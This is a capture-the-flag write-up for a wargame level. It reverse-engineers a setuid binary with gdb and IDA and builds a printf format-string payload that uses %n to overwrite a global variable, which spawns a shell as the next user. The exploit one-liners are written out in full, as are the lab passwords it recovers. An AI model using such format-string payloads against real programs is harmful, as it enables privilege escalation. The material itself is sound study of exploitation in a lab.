# Level 3

## Requirements

- (Optional) IDA / Ghidra

## Walkthrough

1. Login

    ```bash
    > ssh -p 4242 level3@192.168.1.66
    Password: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

    GCC stack protector support:            Enabled
    Strict user copy checks:                Disabled
    Restrict /dev/mem access:               Enabled
    Restrict /dev/kmem access:              Enabled
    grsecurity / PaX: No GRKERNSEC
    Kernel Heap Hardening: No KERNHEAP
    System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3
    ```

2. What’s our entry point ?

    ```bash
    > ls -l
    total 8
    -rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3

    > ./level3
    qwe
    qwe

    > ./level3 qwe
    asd
    asd
    ```

3. Pretty straightforward, nothing interesting.

    ```bash
    > gdb level3
    ...

    > (gdb) info functions
    All defined functions:

    Non-debugging symbols:
    0x08048344  _init
    0x08048390  printf
    0x08048390  printf@plt
    0x080483a0  fgets
    0x080483a0  fgets@plt
    0x080483b0  fwrite
    0x080483b0  fwrite@plt
    0x080483c0  system
    0x080483c0  system@plt
    0x080483d0  __gmon_start__
    0x080483d0  __gmon_start__@plt
    0x080483e0  __libc_start_main
    0x080483e0  __libc_start_main@plt
    0x080483f0  _start
    0x08048420  __do_global_dtors_aux
    0x08048480  frame_dummy
    0x080484a4  v
    0x0804851a  main
    0x08048530  __libc_csu_init
    0x080485a0  __libc_csu_fini
    0x080485a2  __i686.get_pc_thunk.bx
    0x080485b0  __do_global_ctors_aux
    0x080485dc  _fini
    ```

4. Well, we have some standard functions here: `fgets`, `printf`, `fwrite`, … Let’s do our usual reverse engineering.

    ```bash
    	> (gdb) disas main
    Dump of assembler code for function main:
       0x0804851a <+0>:	push   %ebp
       0x0804851b <+1>:	mov    %esp,%ebp
       0x0804851d <+3>:	and    $0xfffffff0,%esp
       0x08048520 <+6>:	call   0x80484a4 <v>
       0x08048525 <+11>:	leave
       0x08048526 <+12>:	ret
    End of assembler dump.

    > (gdb) disas v
    Dump of assembler code for function v:
       0x080484a4 <+0>:	push   %ebp
       0x080484a5 <+1>:	mov    %esp,%ebp
       0x080484a7 <+3>:	sub    $0x218,%esp
       0x080484ad <+9>:	mov    0x8049860,%eax
       0x080484b2 <+14>:	mov    %eax,0x8(%esp)
       0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
       0x080484be <+26>:	lea    -0x208(%ebp),%eax
       0x080484c4 <+32>:	mov    %eax,(%esp)
       0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
       0x080484cc <+40>:	lea    -0x208(%ebp),%eax
       0x080484d2 <+46>:	mov    %eax,(%esp)
       0x080484d5 <+49>:	call   0x8048390 <printf@plt>
       0x080484da <+54>:	mov    0x804988c,%eax
       0x080484df <+59>:	cmp    $0x40,%eax
       0x080484e2 <+62>:	jne    0x8048518 <v+116>
       0x080484e4 <+64>:	mov    0x8049880,%eax
       0x080484e9 <+69>:	mov    %eax,%edx
       0x080484eb <+71>:	mov    $0x8048600,%eax
       0x080484f0 <+76>:	mov    %edx,0xc(%esp)
       0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
       0x080484fc <+88>:	movl   $0x1,0x4(%esp)
       0x08048504 <+96>:	mov    %eax,(%esp)
       0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
       0x0804850c <+104>:	movl   $0x804860d,(%esp)
       0x08048513 <+111>:	call   0x80483c0 <system@plt>
       0x08048518 <+116>:	leave
       0x08048519 <+117>:	ret
    End of assembler dump.

    > (gdb) info variables
    All defined variables:

    Non-debugging symbols:
    ...
    0x0804988c  m
    ...
    ```

5. Using IDA, we get something a bit more readable with Pseudo-Code Generator.

    ```bash
    int m;

    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      return v();
    }

    int v()
    {
      int result; // eax
      char buffer[520]; // [esp+10h] [ebp-208h] BYREF

      fgets(buffer, 512, stdin);
      printf(buffer);
      result = m;
      if ( m == 64 )
      {
        fwrite("Wait what?!\n", 1, 12, stdout);
        return system("/bin/sh");
      }
      return result;
    }
    ```

6. Great. We have our `system("/bin/sh")`, now we need to find a way to access it. Let’s check the documentation first.

    > fgets - Get a string from a stream
    >

    > printf - The functions in the `printf` family produce output according to a format, …
    >
7. Reading the `fgets` documentation, we understand that the function second parameter is a characters limit, therefore, since the `buffer` has a size of `520`, and `fgets` is defined with a limit of `512`, we won’t be able to exploit another `buffer overflow`. But wait a minute, all we need, is `m == 64`, so why not try a simple `register` modification on fly?

    ```bash
    > gdb level3
    ...

    > (gdb) b printf
    ...

    > (gdb) r
    Starting program: /home/user/level3/level3
    qweqwe

    Breakpoint 1, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6

    > (gdb) step
    Single stepping until exit from function printf, which has no line number information.
    qweqwe
    0x080484da in v ()

    > (gdb) ni
    0x080484df in v ()

    > (gdb) set $eax=64

    > (gdb) step
    Single stepping until exit from function v,
    which has no line number information.
    Wait what?!
    $ whoami
    level3
    ```

8.  Oh crap… Doesn’t work, we still `level3`... Well, our last potential target is the `printf`, but how a function which role is to print stuff could be exploited? The first unusual thing to notice, is that the function takes the `buffer` as only argument, instead of `format string` followed by values… While reading the documentation, we noticed something:

    > Code such as `printf(foo);` often indicates a bug, since `foo` may contain a % character.  If `foo` comes from untrusted user input, it may contain `%n`, causing the `printf()` call to write to memory and creating a security hole.
    >

    > %n  -  The number of characters written so far is stored into the integer pointed to by the corresponding argument.
    >
9. That’s it! 100% we have exploit that. To recap, we have to store `64` into `m` (which is a global variable, as seen in step 4, therefore, stored in the `stack` @ `0x0804988c`). To do so, we certainly have to use `%n` from  `printf` which stores the number of characters written. So far, so good, first thing to do is to store our `m` address into our `buffer` to provide it to `%n`.

    ```bash
    > (python -c "print '\x8c\x98\x04\x08'") | ./level3
    ```

10. Good, we are going somewhere. Now, we need to find the offset of our `buffer` from the top of the `stack`, so we know how many `dword` we need to skip (aka. number of `%x`) for our `%n` match our provided address.

    ```bash
    > python -c "print 'AAAA '+'%x '*8" | ./level3
    AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520

    # Using GDB
    > (gdb) b printf
    Breakpoint 1 at 0x8048390

    > (gdb) r
    Starting program: /home/user/level3/level3
    AAAABBBB

    Breakpoint 1, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6

    > (gdb) x/16x $sp
    0xbffff4fc:	0x080484da	0xbffff510	0x00000200	0xb7fd1ac0
    0xbffff50c:	0xb7ff37d0	0x41414141	0x42424242	0x0000000a
    0xbffff51c:	0xb7fef305	0xbffff578	0xb7fde2d4	0xb7fde334
    0xbffff52c:	0x00000007	0x00000000	0xb7fde000	0xb7fff53c
    ```

11. Fine, `AAAA = 41414141`, so we have an offset of `4`. Time to update our script.

    ```bash
    > (python -c "print '\x8c\x98\x04\x08'+'%08x%08x%08x%n'") | ./level3
    ```

12. But wait! We have a required value to store (`64`), so we have to fill the gap with anything.

    ```bash
    # CurrentSize = 4 ('\x8c\x98\x04\x08') + 3 * 8 ('%08x%08x%08x') = 28
    # Gap = 64 - 28 = 36
    > (python -c "print '\x8c\x98\x04\x08'+'A'*36+'%08x%08x%08x%n'") | ./level3
    �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA00000200b7fd1ac0b7ff37d0
    Wait what?!

    # Alternative solution
    # Ignoring 3 parameters using %4$n pattern
    > (python -c "print '\x8c\x98\x04\x08'+'A'*60+'%4\$n'") | ./level3
    ```

13. Target in sight! Let’s capture the flag!

    ```bash
    > (python -c "print '\x8c\x98\x04\x08'+'A'*60+'%4\$n'" ; cat) | ./level3
    �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA00000200b7fd1ac0b7ff37d0
    Wait what?!
    whoami
    level4
    pwd
    /home/user/level3
    cat /home/user/level4/.pass
    b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
    ```

## Documentation

- Function: https://man7.org/linux/man-pages/man3/fgets.3p.html
- Function: https://man7.org/linux/man-pages/man3/printf.3.html
- Course: https://web.ecs.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf
- Discussion: https://stackoverflow.com/questions/7459630/how-can-a-format-string-vulnerability-be-exploited#answer-7466695
- Tutorial:

    [https://www.youtube.com/watch?v=0WvrSfcdq1I](https://www.youtube.com/watch?v=0WvrSfcdq1I)
